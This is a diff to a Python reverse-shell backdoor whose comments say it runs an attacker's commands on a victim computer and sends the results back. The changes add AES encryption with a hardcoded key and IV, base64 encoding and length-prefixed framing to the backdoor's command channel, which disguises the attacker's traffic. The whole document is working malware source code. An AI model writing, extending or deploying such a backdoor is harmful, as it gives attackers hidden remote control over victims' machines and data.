@@ -4,6 +4,10 @@
 # This script will establish the reverse shell connection between attacker and victim machine
 # Commands taken from attacker will be executed through this script on victim computer,
 # then the results will be sent back
+import pickle
+import struct
+
+import Cryptodome.Cipher.AES as AES
 
 # Standard Modules
 import shutil
@@ -36,6 +40,14 @@ class Backdoor:
     port_list = []
 
     queue = Queue()
+
+    iv = b"alZtfBYgrEpOidxu"
+    key = b"wEzDCNvhplrfPTkFt9zUdygZDIVoGC9Z"
+    cipher_decrypt = AES.new(key, AES.MODE_CFB, IV=iv)
+
+    iv = b"alZtfBYgrEpOidxu"
+    key = b"wEzDCNvhplrfPTkFt9zUdygZDIVoGC9Z"
+    cipher_encrypt = AES.new(key, AES.MODE_CFB, IV=iv)
 
     # Initialize the socket connection via constructor with the given ip and port value
     def __init__(self):
@@ -164,17 +176,51 @@ class Backdoor:
     # Sending data plainly might cause problems because end of the data stream cannot be known
     def __send_data(self, data):
         json_data = json.dumps(data).encode()
-        self.connection.send(json_data)
+        cipher_bytes = self.cipher_encrypt.encrypt(json_data)
+        encrypted_text = base64.b64encode(cipher_bytes)
+        msg = struct.pack('>I', len(encrypted_text)) + encrypted_text
+        self.connection.send(msg)
 
     # Read data in 1024 byte chunks until json file is fully received
     def __receive_data(self):
-        json_data = ""
-        while True:
-            try:
-                json_data += self.connection.recv(1024).decode()
-                return json.loads(json_data)
-            except ValueError:
-                continue
+
+        raw_msglen = self.__recvlength(4)
+        if not raw_msglen:
+            return None
+        msglen = struct.unpack('>I', raw_msglen)[0]
+        # Read the message data
+        return self.__recvpayload(msglen)
+
+        # json_data = ""
+        # while True:
+        #     try:
+        #         json_data += self.connection.recv(1024).decode()
+        #         ct = base64.b64decode(json_data)
+        #         pt = self.cipher.decrypt(ct)
+        #         return json.loads(json_data)
+        #     except ValueError:
+        #         continue
+
+    def __recvlength(self, msglen):
+        data = bytearray()
+        while len(data) < msglen:
+            packet = self.connection.recv(msglen - len(data))
+            if not packet:
+                return None
+            data.extend(packet)
+        return data
+
+    def __recvpayload(self, msglen):
+        data = bytearray()
+        while len(data) < msglen:
+            packet = self.connection.recv(msglen - len(data))
+            if not packet:
+                return None
+            data.extend(packet)
+
+        base64decoded = base64.b64decode(data)
+        decrypted_text = self.cipher_decrypt.decrypt(base64decoded)
+        return json.loads(decrypted_text)
 
     # Change directory to given path. Equivalent of "cd" command
     def __change_working_directory_to(self, path):
